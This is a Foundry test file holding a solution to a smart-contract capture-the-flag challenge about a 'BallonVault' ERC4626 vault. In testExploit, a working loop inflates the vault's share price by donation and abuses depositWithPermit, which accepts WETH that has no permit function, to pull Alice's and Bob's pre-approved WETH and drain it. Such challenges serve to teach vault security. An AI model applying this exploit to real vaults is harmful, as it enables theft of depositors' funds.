// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Test.sol";

import {WETH} from "../src/5_balloon-vault/WETH.sol";
import {BallonVault} from "../src/5_balloon-vault/Vault.sol";

/*////////////////////////////////////////////////////////////
//          DEFINE ANY NECESSARY CONTRACTS HERE             //
//    If you need a contract for your hack, define it below //
////////////////////////////////////////////////////////////*/



/*////////////////////////////////////////////////////////////
//                     TEST CONTRACT                        //
////////////////////////////////////////////////////////////*/
contract Challenge5Test is Test {
    BallonVault public vault;
    WETH public weth = new WETH();

    address public attacker = makeAddr("attacker");
    address public bob = makeAddr("bob");
    address public alice = makeAddr("alice");

    function setUp() public {
        vault = new BallonVault(address(weth));

        // Attacker starts with 10 ether
        vm.deal(address(attacker), 10 ether);

        // Set up Bob and Alice with 500 WETH each
        weth.deposit{value: 1000 ether}();
        weth.transfer(bob, 500 ether);
        weth.transfer(alice, 500 ether);

        vm.prank(bob);
        weth.approve(address(vault), 500 ether); //@note pre approve to the vault
        vm.prank(alice);
        weth.approve(address(vault), 500 ether);
    }

    function testExploit() public {
        vm.startPrank(attacker);
        /*////////////////////////////////////////////////////
        //               Add your hack below!               //
        //                                                  //
        // terminal command to run the specific test:       //
        // forge test --match-contract Challenge5Test -vvvv //
        ////////////////////////////////////////////////////*/
        bytes32 na = "";


        weth.approve(address(vault), type(uint256).max);
        weth.deposit{value: 10 ether}();
        
        while(weth.balanceOf(address(attacker)) <= 1000 ether){
            vault.deposit(1 wei, attacker); //@note WETH don't have the permit function
            console.log(vault.totalSupply());
            uint256 tmp = weth.balanceOf(address(attacker));

            weth.transfer(address(vault), tmp); // assets.mulDiv(supply, totalAssets(), rounding) 
        
            uint256 max_tmp = tmp / 10**18 * 10**18;
            uint256 max_drain = (max_tmp > weth.balanceOf(alice)) ? weth.balanceOf(alice) : max_tmp;
            console2.log("max_drain: ", vault.previewDeposit(max_drain));
            console2.log(max_drain, vault.totalSupply(), vault.totalAssets(), max_tmp);
            vault.depositWithPermit(alice, max_drain, 0, 0, na, na);
            vault.depositWithPermit(bob, max_drain, 0, 0, na, na);
            console.log(vault.totalSupply());
            vault.withdraw(vault.maxWithdraw(attacker), attacker, attacker);
            console.log(weth.balanceOf(address(attacker)));
            
        }


        //==================================================//
        vm.stopPrank();

        assertGt(weth.balanceOf(address(attacker)), 1000 ether, "Attacker should have more than 1000 ether");
    }
}
